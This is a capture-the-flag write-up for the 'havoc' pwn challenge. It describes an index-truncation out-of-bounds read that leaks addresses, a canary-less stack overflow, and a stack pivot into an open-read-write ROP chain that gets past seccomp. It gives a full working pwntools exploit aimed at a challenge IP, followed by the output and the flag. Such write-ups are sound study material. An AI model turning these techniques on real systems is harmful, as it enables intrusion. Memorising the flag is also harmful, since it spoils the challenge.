---
title: "havoc — HAVOK'S COSMIC RINGS"
ctf: "Lunar CTF Finals"
date: 2026-10-03
category: pwn
difficulty: hard
points: unknown
flag_format: "Lun4R{...}"
author: "aryan"
---

# havoc — HAVOK'S COSMIC RINGS

## Summary

Remote-only pwn (no binary given). A `short`-truncation bug in the "ring" index check gives a
backward out-of-bounds **read** over the whole PIE image — enough to dump and disassemble the
binary, and to leak PIE + libc at runtime. The real bug is a 48-byte `read` into a 32-byte,
**canary-less** stack buffer (the "confirmation key"). seccomp blocks only `execve/execveat/fork/clone`,
so we pivot into an ORW ROP chain planted in a global buffer and read `/flag.txt`.

## Solution

### Step 1: Recon + recover the binary via the OOB read

The service only exposes `nc 103.49.131.90 1337`. Poking the `index>` prompt shows it leaks
`ring[i]` then asks for a `label`. Boundary testing reveals the integer bug ("the numbers don't add up"):

- index is parsed with `atoi` (32-bit), rejected if `< 0`, then **truncated to a `short`** and only
  checked against `> 3`. A sign-extended negative `short` passes the check, so sending
  `input = N + 2**31` reads `ring[N]` for `N ∈ [-32768, 3]` — a backward OOB read over the PIE image.

With 2 reads per connection I swept backward from the `ring` (vaddr `0x4050`), hit the ELF header,
reconstructed the full binary, and disassembled it. That exposed the rest of the program:

- `ring[-1]` = `&main` (PIE leak), `ring[-2]` = `&puts` (libc leak).
- After 2 calibration rounds: `read(0, 0x4070, 0x200)` into a **global** "plasma" buffer, with a filter
  that rejects the bytes `0F 05` (a `syscall`) — anti-shellcode, irrelevant to ROP.
- `accept()`: `read(0, rbp-0x20, 0x30)` → **48 bytes into a 32-byte buffer with no stack canary** → saved
  rbp + return address overwrite.
- seccomp (`prctl` BPF) kills only `execve(59)`, `execveat(322)`, `fork(57)`, `clone(56)`; `open`/`read`/`write`
  are allowed → **ORW**.

### Step 2: Identify libc

Leaking several resolved GOT entries (anchored on `puts` so ASLR cancels) gave exact inter-symbol
offsets; `libc.rip` matched them to **glibc 2.41** (`libc6_2.41-12+deb13u2_amd64`), confirming
`puts=0x805a0`, `open=0x1037b0`, `read=0x103ed0`, `write=0x104960` and the gadget offsets below.

### Step 3: Leak, pivot, ORW

One connection, one ASLR: leak `&main`→PIE and `&puts`→libc in the two calibration rounds; plant the
ORW chain + filename in the plasma global at `0x4070`; then the confirmation-key overflow sets
`saved_rbp = plasma_base` and returns into `accept()`'s own `leave; ret`, pivoting `rsp` into the chain.

```python
#!/usr/bin/env python3
# solve.py — havoc / HAVOK'S COSMIC RINGS  (Lunar CTF Finals, pwn)
from pwn import *
import re
context.arch = 'amd64'
HOST, PORT = '103.49.131.90', 1337
BASE = 2**31                       # input = N + 2**31  ->  reads ring[N] (short-truncation OOB)

# PIE offsets (recovered by disassembling the OOB-dumped image)
MAIN_OFF, LEAVE_RET, PLASMA = 0x1412, 0x1410, 0x4070
# glibc 2.41 (libc6_2.41-12+deb13u2_amd64) offsets / gadgets
PUTS, OPEN, READ, WRITE = 0x805a0, 0x1037b0, 0x103ed0, 0x104960
POP_RDI, POP_RSI, POP_RDX = 0x2a145, 0x2baa9, 0xb4baa

def leak(io, n):                   # read element index n via the OOB bug, advance the loop
    io.sendline(str(n + BASE).encode())
    v = int(re.search(rb'0x([0-9a-f]+)', io.recvuntil(b'label> ')).group(1), 16)
    io.sendline(b'A')
    return v

def pwn(path=b'/flag.txt'):
    io = remote(HOST, PORT)
    io.recvuntil(b'index> ')
    pie  = leak(io, -1) - MAIN_OFF             # ring[-1] = &main
    io.recvuntil(b'index> ')
    libc = leak(io, -2) - PUTS                 # ring[-2] = &puts
    log.success(f"PIE  = {pie:#x}")
    log.success(f"libc = {libc:#x}")

    plasma   = pie + PLASMA
    path_at  = plasma + 0xE0
    buf_at   = plasma + 0x140
    L = lambda o: libc + o
    chain = b''.join(map(p64, [
        L(POP_RDI), path_at, L(POP_RSI), 0, L(POP_RDX), 0, L(OPEN),      # open("/flag.txt", 0)
        L(POP_RDI), 3,       L(POP_RSI), buf_at, L(POP_RDX), 0x100, L(READ),   # read(3, buf, 0x100)
        L(POP_RDI), 1,       L(POP_RSI), buf_at, L(POP_RDX), 0x100, L(WRITE),  # write(1, buf, 0x100)
    ]))
    # plasma buffer: [fake rbp][chain (rip starts here after pivot)][pad][path]
    pl = (p64(0xdead) + chain).ljust(0xE0, b'\x00') + path + b'\x00'
    assert b'\x0f\x05' not in pl                # pass the anti-syscall filter

    io.recvuntil(b'Upload plasma signature (512 bytes max):')
    io.send(pl)
    # confirmation key: 32 pad + saved_rbp(=plasma) + retaddr(=leave;ret) -> pivot into chain
    io.recvuntil(b'Enter confirmation key:')
    io.send(b'A'*32 + p64(plasma) + p64(pie + LEAVE_RET))
    print(io.recvall(timeout=4).decode(errors='replace'))

pwn()
```

Output:

```
[+] PIE  = 0x55d04bb67000
[+] libc = 0x7f3894438000
[+] Cosmic calibration complete.
Lun4R{c0sm1c_b4rr13rs_br0k3n_4nd_h4v0k_s3cur3d}
```

## Flag

```
Lun4R{c0sm1c_b4rr13rs_br0k3n_4nd_h4v0k_s3cur3d}
```
